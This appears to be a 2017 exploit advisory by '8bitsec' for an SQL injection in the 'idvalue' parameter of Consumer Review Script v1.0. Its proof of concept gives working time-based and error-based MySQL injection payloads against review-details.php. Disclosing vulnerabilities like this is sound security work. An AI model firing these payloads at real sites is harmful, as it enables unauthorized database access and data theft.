@@ -1,0 +1,41 @@
+# Exploit Title: Consumer Review Script v1.0 - SQL Injection
+# Date: 2017-09-12
+# Exploit Author: 8bitsec
+# Vendor Homepage: http://www.phpscriptsmall.com/product/consumer-review-script/
+# Software Link: http://www.phpscriptsmall.com/product/consumer-review-script/
+# Version: 1.0
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-09-12
+
+Product & Service Introduction:
+===============================
+Consumer Review Script
+
+Technical Details & Description:
+================================
+
+SQL injection on [idvalue] URI parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+http://localhost/[path]/review-details.php?idvalue=9 and sleep(5)
+
+Parameter: idvalue (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: idvalue=90 AND (SELECT 5020 FROM(SELECT COUNT(*),CONCAT(0x71716b6a71,(SELECT (ELT(5020=5020,1))),0x717a627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idvalue=90 AND SLEEP(5)
+
+==================
+8bitsec - [https://twitter.com/_8bitsec]
